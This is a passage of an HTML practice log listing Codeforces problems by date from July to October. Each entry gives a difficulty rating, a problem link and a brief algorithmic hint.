href="https://codeforces.com/problemset/problem/992/B">CF922B</a></td><td>Divide the numbers by the $gcd$ first. Then the numbers are co-prime.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/754/D">CF754D</a></td><td>Consider how can you calculate the length of the intersection, which is determined by two variable. If you fix one of them, how can you maximize &#x2F; minimize the other?</td></tr></tbody></table><p>07.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1059/C">CF1059C</a></td><td>Get the first non- $1$ element as soon as possible.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/432/E">CF432E</a></td><td>Find the first element of non-filled position and fill it up.</td></tr></tbody></table><p>07.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/671/A">CF671A</a></td><td>Once a person get to the bin, his “total cost” to get a bottle is always twice the distance between the bottle and the bin.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/597/C">CF597C</a></td><td>Recall what you would do when calculating the number of increasing subsequences.</td></tr></tbody></table><p>07.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/442/B">CF442B</a></td><td>Calculate the marginal effect of adding one person.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1157/D">CF1157D</a></td><td>Find the minimum sum of the whole array. Then adjust it to the target.</td></tr></tbody></table><p>07.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1594/D">CF1594D</a></td><td>If one call another an “imposter”, they are just of different types; otherwise, they are of the same type.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/243/B">CF243B</a></td><td>Clearly, $u, v$ are the most important part of the pattern to find. How can you check the “heads” and “tails”?</td></tr></tbody></table><p>07.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/622/C">CF622C</a></td><td>As you can find any position $p_i$ that satisfy the conditions, you can choose the leftmost &#x2F; rightmost one. The only thing you need to do is to “jump over” a consecutive subarray.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/156/C">CF156C</a></td><td>1. What doesn’t change when the operation is applied? Is it a sufficient condition? 2. What are the important variable of the final string?</td></tr></tbody></table><p>07.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1243/B2">CF1243B2</a></td><td>You only need to use $2$ operations to get one position right.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/190/E">CF190E</a></td><td>The BFS and DFS here should be those unvisited minus those places which you can’t go in the next step.</td></tr></tbody></table><p>07.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/954/D">CF954D</a></td><td>How does the length of shortest path change when you add an edge?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/425/B">CF425B</a></td><td>First of all, figure out the configuration of the whole grid. Then consider why $k$ is so small.</td></tr></tbody></table><p>07.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1119/D">CF1119D</a></td><td>Consider each gap separately.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1172/B">CF1172B</a></td><td>Fix one point first, and then you only need to consider the answer of the subtrees and the order of them.</td></tr></tbody></table><p>07.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/351/A">CF351A</a></td><td>You only need to consider the numbers after the <code>&#39;.&#39;</code>. How many $1000$ -s will they become?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/792/D">CF792D</a></td><td>Find the relation between the numbers of a node, its parent and its children.</td></tr></tbody></table><p>07.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/798/C">CF798C</a></td><td>Actually, the $gcd$ can’t change much. Why?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/367/C">CF367C</a></td><td>If we choose $k$ numbers, what is the minimum length of the array?</td></tr></tbody></table><p>07.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1023/D">CF1023D</a></td><td>What conditions should the final array satisfy?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/886/D">CF886D</a></td><td>The numbers of appearances of all the substrings of the given strings should be the same.</td></tr></tbody></table><p>07.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1660/E">CF1660E</a></td><td>We want to make the maximum number of $1$ on the diagonal. The operations is actually “moving” the grid up or down, left or right. “Moving” is relative.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/231/E">CF231E</a></td><td>Where can you find a different way between the nodes? Count that in a tree.</td></tr></tbody></table><p>07.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/814/C">CF814C</a></td><td>You should notice that there can’t be too many different queries.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/713/B">CF713B</a></td><td>It is always easier to solve the problem for $1$ rectangle. Find one large rectangle that only contains one without overlapping with the other.</td></tr></tbody></table><p>07.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/513/B2">CF513B2</a></td><td>Think of the smallest element. How many times is it counted?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1105/D">CF1105D</a></td><td>Whick points can generate new points in the next round? How can you consider $speed[i]$ ?</td></tr></tbody></table><p>07.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/626/D">CF626D</a></td><td>Consider the first $2$ balls as a whole.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1163/C2">CF1163C2</a></td><td>There are only $3$ different position conditions between $2$ lines.</td></tr></tbody></table><p>07.31</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1041/D">CF1041D</a></td><td>The “area” is “good” for you, so at least make full use of the leftmost chosen one.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/916/B">CF916B</a></td><td>First of all, find the shortest sequence. Prove it is the lexicographically largest one.</td></tr></tbody></table><h3 id="08月"><a href="#08月" class="headerlink" title="08月"></a>08月</h3><p>08.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1329/B">CF1329B</a></td><td>If you have $a_1(b_1)$ , what conditions should $b_2$ satisfy?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/196/B">CF196B</a></td><td>If one can go infinitely far in one grid, at least one of $(x\bmod n,y\bmod m)$ should be visited infinite times.</td></tr></tbody></table><p>08.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/888/D">CF888D</a></td><td>Consider different $k$ -s.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/269/C">CF269C</a></td><td>If the in-flows of one point are already determined, the out-flows are also determined.</td></tr></tbody></table><p>08.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/835/C">CF835C</a></td><td>The stars shine cyclically.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/538/F">CF538F</a></td><td>For each $k$, how many conditions should you check?</td></tr></tbody></table><p>08.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/835/C">CF835C</a></td><td>The stars shine cyclically.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/538/F">CF538F</a></td><td>For each $k$, how many conditions should you check?</td></tr></tbody></table><p>08.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1177/B">CF1177B</a></td><td>Consider numbers which have the same number of digits separately.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/832/D">CF832D</a></td><td>Consider the patterns of the paths.</td></tr></tbody></table><p>08.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/578/B">CF578B</a></td><td>The largest number determines the length of the binary expression of the answer.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/689/E">CF689E</a></td><td>Consider the contribution of each point.</td></tr></tbody></table><p>08.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/729/D">CF729D</a></td><td>For each segment of $0$ , find out the minimum cells to detect.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/557/D">CF557D</a></td><td>What is the maximum answer? From $0$ to the maximum answer, what conditions should the graph satisfy?</td></tr></tbody></table><p>08.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/476/C">CF476C</a></td><td>Write the division equation with a remainder in the form of $x&#x3D;d\times y+r$ .</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/575/F">CF575F</a></td><td>Only a few points matter. Use them.</td></tr></tbody></table><p>08.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/949/A">CF949A</a></td><td>Try to make the number of arrays as small as possible. Then we should not create an array unless it is necessary.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/731/E">CF731E</a></td><td>It’s about choosing the prefix sum in turn while the array keeps changing. Or, the array is not actually changing?</td></tr></tbody></table><p>08.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1090/D">CF1090D</a></td><td>Find $2$ elements that can be swapped.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/724/D">CF724D</a></td><td>You should always use the lexicographically smaller characters.</td></tr></tbody></table><p>08.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/822/D">CF822D</a></td><td>$l, r$ isn’t too large. And the sum of the numbers of factors of integers from $l$ to $r$ is not that large.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/722/D">CF722D</a></td><td>How can you make the largest number smaller?</td></tr></tbody></table><p>08.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/578/A">CF578A</a></td><td>There are only $2$ types of segments.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1092/E">CF1092E</a></td><td>Hope you’re familiar with the problem where there are $2$ trees in a forest.</td></tr></tbody></table><p>08.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/464/A">CF464A</a></td><td>Find the first position to change, which should be as closer to the right end as possible.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/862/D">CF862D</a></td><td>If you use binary search to find one $0&#x2F;1$, how many queries do you need?</td></tr></tbody></table><p>08.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1252/C">CF1252C</a></td><td>What makes a move from $(x,y)$ to $(x’,y’)$ a legal one?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/441/D">CF441D</a></td><td>How does the answer change when you swap $2$ elements?</td></tr></tbody></table><p>08.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/993/A">CF993A</a></td><td>Find the representative points.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1039/C">CF1039C</a></td><td>For each $x$, find the number of corresponding methods.</td></tr></tbody></table><p>08.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/827/B">CF827B</a></td><td>Root the tree at the middle of the diameter.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/622/D">CF622D</a></td><td>Find the minimum first. Note that $d_n$ is not actually used in the formula.</td></tr></tbody></table><p>08.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1076/D">CF1076D</a></td><td>Some edges are more important when considering the shortest path.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1600/E">CF1600E</a></td><td>The second player’s strategy: Find a corresponding move for each move of the first player.</td></tr></tbody></table><p>08.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1644/D">CF1644D</a></td><td>Consider which round of coloring lasts till the end.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/681/D">CF681D</a></td><td>First of all, decide which men should appear in your answer. Then, decide their order. At last, check the order.</td></tr></tbody></table><p>08.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/689/C">CF689C</a></td><td>Use a formula to describe the pattern of the array.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/360/B">CF360B</a></td><td>Consider DP. If the value is included in the DP, then the number of status can be too large. How can you avoid it?</td></tr></tbody></table><p>08.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/878/A">CF878A</a></td><td>Consider each bit separately.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1184/A2">CF1184A2</a></td><td>For each $k$, what can you infer from the conditions?</td></tr></tbody></table><p>08.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/849/B">CF849B</a></td><td>If $3$ points is divided in $2$ groups, …</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/431/E">CF431E</a></td><td>You should fill up the containers with the minimum number of mercury first. How much volume can you put in them without exceeding the other containers? How can you calculate it efficiently?</td></tr></tbody></table><p>08.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/432/C">CF432C</a></td><td>You just need to process $swap(i,j)$ efficiently.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1147/B">CF1147B</a></td><td>If you rotate $x$ units and the image is the same, can your $x$ be smaller?</td></tr></tbody></table><p>08.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1290/B">CF1290B</a></td><td>What is the actual conditions to check?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1237/C2">CF1237C2</a></td><td>Consider the problem in a lower dimension.</td></tr></tbody></table><p>08.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1278/C">CF1278C</a></td><td>Consider the remaining jars.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1019/B">CF1019B</a></td><td>$(a_{i}-a_{i+n&#x2F;2})+(a_{i+n&#x2F;2}-a_i)&#x3D;0$</td></tr></tbody></table><p>08.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/850/A">CF850A</a></td><td>Consider the problem in a lower dimension. If we fix one point $a$ , we can’t have too many points other than $a$ .</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/248/C">CF248C</a></td><td>The wall is like a mirror, so kick the ball towards the target “in the mirror”. To get the ball in, it’s always good to kick it towards farther side of the gate.</td></tr></tbody></table><p>08.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/768/B">CF768B</a></td><td>As $r-l$ is not large, we can find out the answer of each position.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1176/F">CF1176F</a></td><td>Consider the basic DP. Do we really need to consider all the possible status in the previous round?</td></tr></tbody></table><p>08.31</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/847/B">CF847B</a></td><td>Instead of constructing each array separately, you can consider the position of each element.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/1673/F">CF1673F</a></td><td>A cycle means $0$ .</td></tr></tbody></table><h3 id="09月"><a href="#09月" class="headerlink" title="09月"></a>09月</h3><p>09.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/117/B">CF117B</a></td><td>$s_1$ has no reason to be large.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1055/C">CF1055C</a></td><td>As the length of the intervals are fixed, we just need to let their ends to be as close as possible.</td></tr></tbody></table><p>09.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/873/D">CF873D</a></td><td>Add one occurence of “merge-sort” each time.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1031/D">CF1031D</a></td><td>We should at least maximize the prefix $a$ -s at first. Then we actually has nothing to change.</td></tr></tbody></table><p>09.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/449/A">CF449A</a></td><td>Consider one edge first. What can be the possible separations?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/494/B">CF494B</a></td><td>DP. If the last interval ends at $r$ , what should its right end satisfy?</td></tr></tbody></table><p>09.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/769/D">CF769D</a></td><td>There aren’t many numbers that can be expressed by $nums[i] \mathrm{xor} nums[j]$ and have exactly $k$ bits.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/353/D">CF353D</a></td><td>Only consider boys or girls, not them both.</td></tr></tbody></table><p>09.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/593/B">CF593B</a></td><td>Use a single formula to check if the intersection lays between $x_1$ and $x_2$ .</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/838/B">CF838B</a></td><td>How can you go from $u$ to $v$ ? What is the distance dependent on?</td></tr></tbody></table><p>09.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/858/D">CF858D</a></td><td>You only need to decide whether all occurences of one substring come from the same string.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/870/E">CF870E</a></td><td>Each point means a connection between a vertical line and a horizontal line.</td></tr></tbody></table><p>09.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/551/B">CF551B</a></td><td>Enumerate the number of $b$ -s.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1017/D">CF1017D</a></td><td>Pre-process to calculate the final answer. We only have $2^n$ kinds of “differences” and $101$ types of values to consider.</td></tr></tbody></table><p>09.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/913/D">CF913D</a></td><td>For a set of problems, we should at least delete those useless ones. For the others, we can always use greedy approach.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/744/B">CF744B</a></td><td>The problem is all about finding minimum value without a point. It’s actually finding the union of a few sets.</td></tr></tbody></table><p>09.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/644/B">CF644B</a></td><td>Consider each query by time order. Construct a queue to check if the query is implemented.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/314/B">CF314B</a></td><td>First of all, all characters should be found greedily. As the lengths of strings are not too long, there are not many status.</td></tr></tbody></table><p>09.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1267/E">CF1267E</a></td><td>We only need to have one candidate to get the votes that are more than the $n$ -th one, so consider each candidate separately.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1061/D">CF1061D</a></td><td>After using a TV, keeping it is like having a coupon.</td></tr></tbody></table><p>09.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/735/C">CF735C</a></td><td>Think of the problem reversely. That is, find the largest number of nodes in a balanced tree with a height of $h$ .</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/336/D">CF336D</a></td><td>If we consider a AND operator, $0$ means a reset. Here, a similar thing happens.</td></tr></tbody></table><p>09.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/682/C">CF682C</a></td><td>If a $u$ doesn’t satisfy the condition, its subtree should all be removed.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/1065/E">CF1065E</a></td><td>Check the string and the reversed string. What happens in a operation?</td></tr></tbody></table><p>09.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/641/C">CF641C</a></td><td>Odd-s and even-s move together.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1063/C">CF1063C</a></td><td>It is hard to think about this problem in a 2D plane. Try considering it on a line.</td></tr></tbody></table><p>09.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/433/C">CF433C</a></td><td>How can you calculate the difference between the status with &#x2F; without changing $x$ to $y$ .</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/729/E">CF729E</a></td><td>Find the sufficient and necessary condition first.</td></tr></tbody></table><p>09.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1279/D">CF1279D</a></td><td>Process each step carefully.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/340/E">CF340E</a></td><td>Inclusion-exclusion method.</td></tr></tbody></table><p>09.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/281/B">CF281B</a></td><td>The demoninator isn’t large, so we can enumerate it.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/309/A">CF309A</a></td><td>Additivity of expectation. How can a bumping occur?</td></tr></tbody></table><p>09.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/615/B">CF615B</a></td><td>Calculate the longest tail for each node.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/852/C">CF852C</a></td><td>How can you calculate the total area? If the angle formed by two sides are fixed, How is the area determined?</td></tr></tbody></table><p>09.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1082/B">CF1082B</a></td><td>Almost the same as changing one $S$ into $G$ .</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/413/E">CF413E</a></td><td>Classic segment tree problem. It’s just what variable should you choose.</td></tr></tbody></table><p>09.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1073/C">CF1073C</a></td><td>When $maxID-minID+1$ is fixed, what segment can you change? Where can you get?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1648/C">CF1648C</a></td><td>Find the first position where the strings differ.</td></tr></tbody></table><p>09.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/436/C">CF436E</a></td><td>It’s actually constructing a tree.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/731/F">CF731F</a></td><td>Derive the final formula to calculate first. The $a_i$ can’t be large. How can that help?</td></tr></tbody></table><p>09.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1210/B">CF1210B</a></td><td>If a student can find someone who he is not better than, what condition should that “someone” satisfy?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/761/E">CF761E</a></td><td>To avoid intersection, design the length of each edge carefully.</td></tr></tbody></table><p>09.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/895/B">CF895B</a></td><td>How can you calculate the number of $y$ in the interval $[l,r]$ that is divisible by $x$ .</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/975/D">CF975D</a></td><td>List out the equation that two points should satisfy such that they meet at some point.</td></tr></tbody></table><p>09.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/416/C">CF416C</a></td><td>Consider each table from small to large.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/900/E">CF900E</a></td><td>How can you check if there is a “match”?</td></tr></tbody></table><p>09.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/429/B">CF429B</a></td><td>Consider the path around the intersection position.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/1679/E">CF1679E</a></td><td>For each substring, there is a multiple choice of character set that can make it palindrome. How can the set be calculated? For each set, how many different palindromes can be produced?</td></tr></tbody></table><p>09.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/946/D">CF946D</a></td><td>For each day, if you skip $k$ lessons, there is a maximum amount of time you can save.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/935/D">CF935D</a></td><td>Again, if a string is smaller than the other, we should let their prefix be the same and the next letter be smaller.</td></tr></tbody></table><h3 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h3><p>10.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/363/D">CF363D</a></td><td>If we fix the number of rented bikes, it is easy to choose which bikes to rent.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1677/C">CF1677C</a></td><td>Transform $|num_{a_i}-num_{b_i}|$ into $|num_i-num_{p_i}|$. What is that supposed to 